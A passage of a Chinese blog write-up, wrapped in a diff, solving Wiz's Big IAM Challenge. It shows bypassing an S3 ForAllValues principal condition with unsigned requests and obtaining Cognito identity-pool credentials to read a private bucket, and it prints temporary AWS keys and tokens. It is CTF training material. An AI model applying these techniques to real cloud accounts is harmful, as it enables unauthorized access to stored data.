+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>先看下bucket</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com
+</span></span></span></code></pre></div><p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/iam%20ctf/3.png" alt="Untitled">
+
+</p>
+<p>access deny 限制admin了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span> <span style="color:#f1fa8c">&#34;ForAllValues:StringLike&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;aws:PrincipalArn&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:iam::133713371337:user/admin&#34;</span>
+</span></span></code></pre></div><p>显然这里要绕过admin</p>
+<p>就在看ForAllValues:StringLike的方法解释的时候似乎看到了了绕过的方法</p>
+<p><a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys">https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition-single-vs-multi-valued-context-keys.html#reference_policies_condition-multi-valued-context-keys</a></p>
+<ul>
+<li>
+<p><code>ForAllValues</code> – 此限定词测试请求集的每个成员的值是否为条件上下文键集的子集。如果请求中的每个上下文键值均与策略中的至少一个上下文键值匹配，则条件返回 true。如果请求中没有上下文键或者上下文键值解析为空数据集（如空字符串），则也会返回 true。为了防止缺失的上下文键或具有空值的上下文键评估为 true，您可以在策略中包含具有 false 值的 <a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html#Conditions_Null">Null</a> 条件运算符，以检查上下文键是否存在且其值不为空。</p>
+<p><strong>重要</strong></p>
+<p>如果将 <code>ForAllValues</code> 与 <code>Allow</code> 效果一起使用，请小心谨慎，因为如果请求上下文中意外出现缺失的上下文键或具有空值的上下文键，则策略可能会过于宽松。您可以在策略中包含具有 false 值的 <code>Null</code> 条件运算符，以检查上下文键是否存在且其值不为空。有关示例，请参阅 <a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/access_tags.html#access_tags_control-tag-keys">根据标签键控制访问</a>。</p>
+</li>
+</ul>
+<p>如何实现没有上下文键值的请求现实是个问题</p>
+<p>找半天也没找到，看wp 说是用 s3api 的<code>--no-sign-request</code></p>
+<ul>
+<li>
+<p><code>-no-sign-request</code> (boolean)</p>
+<p><code>--no-sign-request</code> （布尔值）</p>
+</li>
+</ul>
+<p>Do not sign requests. Credentials will not be loaded if this argument is provided.不要对请求进行签名。如果提供此参数，则不会加载凭据。</p>
+<pre tabindex="0"><code>aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix &#39;files/&#39; --no-sign-request
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> aws s3api list<span style="color:#ff79c6">-</span>objects <span style="color:#ff79c6">--</span>bucket thebigiamchallenge<span style="color:#ff79c6">-</span>admin<span style="color:#ff79c6">-</span>storage<span style="color:#ff79c6">-</span>abf1321 <span style="color:#ff79c6">--</span>prefix <span style="color:#f1fa8c">&#39;files/&#39;</span> <span style="color:#ff79c6">--</span>no<span style="color:#ff79c6">-</span>sign<span style="color:#ff79c6">-</span>r
+</span></span><span style="display:flex;"><span>equest
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Contents&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Key&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;files/flag-as-admin.txt&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;LastModified&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2023-06-07T19:15:43.000Z&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;ETag&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;\&#34;e365cfa7365164c05d7a9c209c4d8514\&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Size&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">42</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;StorageClass&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;STANDARD&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Key&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;files/logo-admin.png&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;LastModified&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2023-06-08T19:20:01.000Z&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;ETag&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;\&#34;c57e95e6d6c138818bf38daac6216356\&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Size&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">81889</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;StorageClass&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;STANDARD&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}<span style="color:#ff79c6">&gt;</span> aws s3api list<span style="color:#ff79c6">-</span>objects <span style="color:#ff79c6">--</span>bucket thebigiamchallenge<span style="color:#ff79c6">-</span>admin<span style="color:#ff79c6">-</span>storage<span style="color:#ff79c6">-</span>abf1321 <span style="color:#ff79c6">--</span>prefix <span style="color:#f1fa8c">&#39;files/&#39;</span> <span style="color:#ff79c6">--</span>no<span style="color:#ff79c6">-</span>sign<span style="color:#ff79c6">-</span>request
+</span></span></code></pre></div><p>访问即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//thebigiamchallenge-admin-storage-abf1321.s3.amazonaws.com/files/flag-as-admin.txt
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{wiz<span style="color:#ff79c6">:</span>principal<span style="color:#ff79c6">-</span>arn<span style="color:#ff79c6">-</span>is<span style="color:#ff79c6">-</span>not<span style="color:#ff79c6">-</span>what<span style="color:#ff79c6">-</span>you<span style="color:#ff79c6">-</span>think}
+</span></span></code></pre></div><p>这里不能登录iam用户直接访问，没登录的凭证，只有account id</p>
+<h3 id="5do-i-know-you">5.Do I know you?</h3>
+<p>We configured AWS Cognito as our main identity provider. Let&rsquo;s hope we didn&rsquo;t make any mistakes.</p>
+<p>策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Sid&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;VisualEditor0&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;mobileanalytics:PutEvents&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;cognito-sync:*&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Sid&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;VisualEditor1&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;s3:GetObject&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;s3:ListBucket&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;arn:aws:s3:::wiz-privatefiles&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;arn:aws:s3:::wiz-privatefiles/*&#34;</span>
+</span></span><span style="display:flex;"><span>            ]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>看下桶子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//wiz-privatefiles.s3.amazonaws.com
+</span></span></span></code></pre></div><p>还是accessdenied</p>
+<p>看下什么是amazon cognito</p>
+<p><a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html">https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html</a></p>
+<p>Amazon Cognito 是 Web 和移动应用程序的身份平台。它是用户目录、身份验证服务器以及 OAuth 2.0 访问令牌和 AWS 凭证的授权服务</p>
+<p>这里主要是要访问aws s3的资源，这里看向身份池的描述</p>
+<p>当您想要授权经过身份验证的用户或匿名用户访问您的 AWS 资源时，请设置 Amazon Cognito 身份池。身份池为您的应用程序颁发 AWS 凭证，以便向用户提供资源。您可以使用可信身份提供者（如用户群体或 SAML 2.0 服务）对用户进行身份验证。此身份提供者还可以选择为访客用户颁发凭证。身份池同时使用基于角色和基于属性的访问控制来管理您的用户访问 AWS 资源的授权。</p>
+<p>为了补充经过身份验证的身份，您还可以配置一个身份池来授权 AWS 访问，而无需 IdP 身份验证。您可以提供自己的自定义身份验证证明，也可以不提供身份验证。您可以使用<a href="https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html#enable-or-disable-unauthenticated-identities">未经身份验证的身份</a>向任何请求临时 AWS 凭证的应用程序用户授予此类凭证。身份池还接受声明，并根据您自己的自定义模式，使用<a href="https://docs.aws.amazon.com/cognito/latest/developerguide/developer-authenticated-identities.html">经过开发人员验证的身份</a>颁发凭证。</p>
+<p>申请临时凭证的cil</p>
+<p><a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/">https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/</a></p>
+<p>网站源码有身份池id</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>AWS.config.credentials <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> AWS.CognitoIdentityCredentials({IdentityPoolId<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#34;</span>});
+</span></span></code></pre></div><p>现在先拿id再拿临时凭证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws cognito<span style="color:#ff79c6">-</span>identity get<span style="color:#ff79c6">-</span>id <span style="color:#ff79c6">--</span>identity<span style="color:#ff79c6">-</span>pool<span style="color:#ff79c6">-</span>id us<span style="color:#ff79c6">-</span>east<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>b73cb2d2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0</span>d00<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>e77<span style="color:#ff79c6">-</span><span style="color:#bd93f9">8</span>e80<span style="color:#ff79c6">-</span>f99d9c13da3b
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws cognito<span style="color:#ff79c6">-</span>identity get<span style="color:#ff79c6">-</span>credentials<span style="color:#ff79c6">-</span><span style="color:#ff79c6">for</span><span style="color:#ff79c6">-</span>identity <span style="color:#ff79c6">--</span>identity<span style="color:#ff79c6">-</span>id us<span style="color:#ff79c6">-</span>east<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">157</span>d6171<span style="color:#ff79c6">-</span>ee01<span style="color:#ff79c6">-</span>c92e<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>c7f<span style="color:#ff79c6">-</span><span style="color:#bd93f9">81</span>f8a7f406e0
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;IdentityId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:157d6171-ee01-c92e-6c7f-81f8a7f406e0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Credentials&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;AccessKeyId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;ASIARK7LBOHXJW73PW7H&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SecretKey&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;k899SriLr2S+28Ad10pnfKYgUnwx6r5VWQAyECnP&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SessionToken&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;IQoJb3JpZ2luX2VjEBsaCXVzLWVhc3QtMSJHMEUCIQDBFsvKQUGVZMPKbtcHcnh3GFu53P48qhgnH8R
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rlSPNtAIgL8iaIiPp4txzVaMsk3kRkCsJReaWrx25nVj1/KYsojMq0QUI0///////////ARAAGgwwOTIyOTc4NTEzNzQiDHygZIKVYF4
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">PuLtqtiqlBR1OVVIxB3wfNABfbVJyKRPIiyK8g8gKRyJrF4X17Pr4pSXM6Z2qD5qLM3iN3ixcWBVXhmF6+/GdY0lrViLKflzsl2b4gQS
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ff2l0rj/pnxgRgeNXXBZuBePUC+aa1rDGTrN4E3qH6C3ldx6s6jwr4zCxkmqiYRsy6GGosTJiORKpJ472v0MWJUBDNnWgajRZ7+fOGyJ
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">t7YqaOt57uiZU/2xJgT3sbWjBfJ9W12vsTYSob+gU6FOgS7NlZsd58fSZPPOpheL22SoWBBk6/XMgPwA96lyowJzNrwNcY1iRd0m1K4n
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">YMNiptcPSa8+aIHKpt6gQ++qMYYUGrMyIAgb/ZNeR17AVaWPsorqW8+0M5N1kIfufOOxJpOXgDuqQNIDwrCvk9paaPtj2W4aCfyOPJdt
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fIdy3MeoIK0jYYqdUft+buGVpO+cvRS5lZHQ3blrn2UNjmC0PQ9pwwF0bmAsqVabj2KFzuik2LIlpOMofNhFFXRsPWzNK0VJurU5Mhc5
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">/VBCj/LODgpNizXI5eUntqRh1Jc6Ster6CHeaHpnUc4tJHo06Cv2Hamc9e+TpBptNzFIstUE0SE5ghBJkWQQHCfL5fbUs2YQmX3Z8rFh
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ASlcJIZgZiUkxmNZkEBTtcBChkRmoE4ZGOnKXobb4G85xK+OVfjqZqdRPOKdXVQPBfuKvHq77cGnU3SKhVqDCr7XrmzpcAdDVIKPOevt
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">dx/rdZCbXfvCURtTCOr92vIAB+ObxsGrjcGrzVU8vC4kW5VECbANaLCUdNCXpea82r3DRBUaz6A15QgfRNgckS/CyPrdBAWci4bKiQfh
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">35QSz7Did9X0M1x9JSQArQwPdJsbHveH5cM7QQ8qI0NMysIf7rs9exSDBbpVlesJ2u+/4UAWjR2lDQI+7MMDQ2K0GOt4CVtKjlbAsRaR
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">53LG41eSbXJoxhL/mW4K3nQvsB5fxXStvzJkem5uzSiS2aMfTnNIMeWFC/4wk3vlW2GiexMVKSXS5Ll7hObDG3FpbFfkXfZRnC3GI19/
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">cnfdYSMU6nKRNjcxAwKU3GAhbbLGxP+1CKWpumS9c3GKs3OYe7yDIxB6BPFYNw4u+9Z3zNfW1Ifz+ohScd08xfh7C6hKvIvLKd9Ol/Ap
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">eFGa7rl7iEk6FTGC71b7JOn2OZ26IsLs7sS3pDKLztyhtpA6HQSVn9MhnCWNuL5TnYyZqxOvQ/bh3JGUz0BfT3t2hd888TM1ZGPLrWMk
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">JFzYFVlPuWZyN6qsX1AqgIYyTCC1jGXXYJGOuvpq3AghBQHsT3xaYgoGUPgQ3s1tN07/EhgbuRNvL2StEzBcmIgk5eojTYG8xlwJKxDf
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">AbzJrePlk6YxOfTiqdoAqqV98wpKHptNIuqfoBvM=&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Expiration&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">1706440272.0</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后，配置该身份凭证：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws configure set aws_access_key_id ASIARK7LBOHXBVZWIPX5
+</span></span><span style="display:flex;"><span>aws configure set aws_secret_access_key Bl54q7tkNx7pmrkA85snaYEN1rPQSLM<span style="color:#ff79c6">/</span>mcKgY8<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>aws configure set aws_session_token <span style="color:#f1fa8c">&#34;IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJHMEUCIAKwj+CXV6sJbAy5F3drvxqlynkwpeD3Xh+OpmA
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">uL7hSAiEA8KVef3llkmskniu0IoCzQj0u/9jer6lk2NWbaxUEu8Uq0QUI0///////////ARAAGgwwOTIyOTc4NTEzNzQiDPuI/LrzfcR
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rHfUjgiqlBR5l9zt9c5NFk5hEvlSwio2KTz1xKGFZowzJ6cRTn7u9xDWQCNsgvWrQIvi/C5zpDZWGD2uVrpCQX9n5u7Uu1qgpR+Wrpgy
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">hXS9B28lur64xO6AJDse4azO3Rh8aR6Q31F5/qe0zNtTrxm0m3v6wtkYVVNvBKA+KYJpBRvAwz/auRKaS29Rtye/Sjn9jle9yg8tDEb9
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">WZVA4ORw/P71ueSE0GDN2WaPFoQf2tQr5FMgaNPWQwQgSJC8e7lL+PmASJuHZbnLgpoBRsCes442zzxdrGUAkeEp0bN0BYxgcxQa6Gyo
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">99hOnqTG8echpSb2KRU56jXqdAxccT/bJIPx9KyvSGlArlgz9mD6zsIuLYztV7o+JFTqgiiHZCeiODqqEl4iH5jxKSUyT2DQUxcI3s+9
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Hb6Zxa3VICxx8Y7w31hgjpZXsjKqCI8b796XLzgGLHpeDbJkjsND5wcA7//vGpCXiARwHd1rxY50BjiB5LrdSN4lYkiWeKfJ1bgxMr6F
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">srAGZYVntiOQC6ZV1WEt4sGqYCH9fYuVH+WFVf5Fjn2M5l/0PKPY5hNLSuNs+dIuAXzYncxjKYHLfNkVpMFvAiEJPm+5gm9dKkySgZtE
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Sxre+D97ULhZd4kTQgMiGKFLCLFo34PJzy7ZbELm1GGNGCqjBh4PEq6QnHcJ/ReRNkeTzqNoa/SlKmguLOW2sDo4Nibs8JxExFmwkgjA
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">NLtlsFpaFHYZWlG7zYpnt5+5fvGPXBad4X8XU8Bp7wVa3gH+kDmGsxkpIJWXCCJaZ0zD343KYQE45vfQApLE2tOYjOjYJ9rr3EdW1M0f
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">6jEh0rakbSEhVCaAT2POow2bD6e/7g3ckMMy8jycCRM8FY137affweRbOVFT83evrm45yFT9vQHJCjliyMIfD2K0GOt4CyFK2ej6xWxF
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">axLTZ2AC9i9rAiQpHq2g9M8c1xmqNMWjAMIU4sHBjsBwUOD86/gNAvRMCfRxWjAJNTIVJnc8PMxdzgqmUMilbC2ZmaLeiwWhMFhn10aR
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rXcpjZtVxw096YAzgFEAQvus4qqzZGSfl7GEZPbwvj4qZ5cffjGeTKSMBJfWQw2tSW3tC4KSbtEJXHLmg6pXtS12L9QjNSARBuRJ4Pon
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">QGlbgYDuN8DjJI54OCPzEcBnUlga3RfFd4aDAuRI8t0LLXkZJnkHzdEluoJp7Bji1yR4FwHcWGZ7XJCx7S7GV2PpTI/CHaFs0yDECWo6
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">defTnb35+6lrCidyuMFhY8MzGc89ggcjjipwiPho2D/YHsT4VlSFQ9xAP99q1vAtHPr0IOqLxQyNf/qUooyDD3DeH5bNeOjC3/Am56Jg
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">r2b8A9JTlymdSJb0RyG7eD1Ilj7V8lx0v+MxN/vI=&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>set AWS_ACCESS_KEY_ID<span style="color:#ff79c6">=</span>ASIARK7LBOHXJW73PW7H
+</span></span><span style="display:flex;"><span>set AWS_SECRET_ACCESS_KEY<span style="color:#ff79c6">=</span>k899SriLr2S<span style="color:#ff79c6">+</span><span style="color:#bd93f9">28</span>Ad10pnfKYgUnwx6r5VWQAyECnP
+</span></span><span style="display:flex;"><span>set AWS_SESSION_TOKEN<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;IQoJb3JpZ2luX2VjEBsaCXVzLWVhc3QtMSJHMEUCIQDBFsvKQUGVZMPKbtcHcnh3GFu53P48qhgnH8R
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rlSPNtAIgL8iaIiPp4txzVaMsk3kRkCsJReaWrx25nVj1/KYsojMq0QUI0///////////ARAAGgwwOTIyOTc4NTEzNzQiDHygZIKVYF4
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">PuLtqtiqlBR1OVVIxB3wfNABfbVJyKRPIiyK8g8gKRyJrF4X17Pr4pSXM6Z2qD5qLM3iN3ixcWBVXhmF6+/GdY0lrViLKflzsl2b4gQS
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ff2l0rj/pnxgRgeNXXBZuBePUC+aa1rDGTrN4E3qH6C3ldx6s6jwr4zCxkmqiYRsy6GGosTJiORKpJ472v0MWJUBDNnWgajRZ7+fOGyJ
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">t7YqaOt57uiZU/2xJgT3sbWjBfJ9W12vsTYSob+gU6FOgS7NlZsd58fSZPPOpheL22SoWBBk6/XMgPwA96lyowJzNrwNcY1iRd0m1K4n
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">YMNiptcPSa8+aIHKpt6gQ++qMYYUGrMyIAgb/ZNeR17AVaWPsorqW8+0M5N1kIfufOOxJpOXgDuqQNIDwrCvk9paaPtj2W4aCfyOPJdt
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fIdy3MeoIK0jYYqdUft+buGVpO+cvRS5lZHQ3blrn2UNjmC0PQ9pwwF0bmAsqVabj2KFzuik2LIlpOMofNhFFXRsPWzNK0VJurU5Mhc5
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">/VBCj/LODgpNizXI5eUntqRh1Jc6Ster6CHeaHpnUc4tJHo06Cv2Hamc9e+TpBptNzFIstUE0SE5ghBJkWQQHCfL5fbUs2YQmX3Z8rFh
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ASlcJIZgZiUkxmNZkEBTtcBChkRmoE4ZGOnKXobb4G85xK+OVfjqZqdRPOKdXVQPBfuKvHq77cGnU3SKhVqDCr7XrmzpcAdDVIKPOevt
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">dx/rdZCbXfvCURtTCOr92vIAB+ObxsGrjcGrzVU8vC4kW5VECbANaLCUdNCXpea82r3DRBUaz6A15QgfRNgckS/CyPrdBAWci4bKiQfh
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">35QSz7Did9X0M1x9JSQArQwPdJsbHveH5cM7QQ8qI0NMysIf7rs9exSDBbpVlesJ2u+/4UAWjR2lDQI+7MMDQ2K0GOt4CVtKjlbAsRaR
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">53LG41eSbXJoxhL/mW4K3nQvsB5fxXStvzJkem5uzSiS2aMfTnNIMeWFC/4wk3vlW2GiexMVKSXS5Ll7hObDG3FpbFfkXfZRnC3GI19/
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">cnfdYSMU6nKRNjcxAwKU3GAhbbLGxP+1CKWpumS9c3GKs3OYe7yDIxB6BPFYNw4u+9Z3zNfW1Ifz+ohScd08xfh7C6hKvIvLKd9Ol/Ap
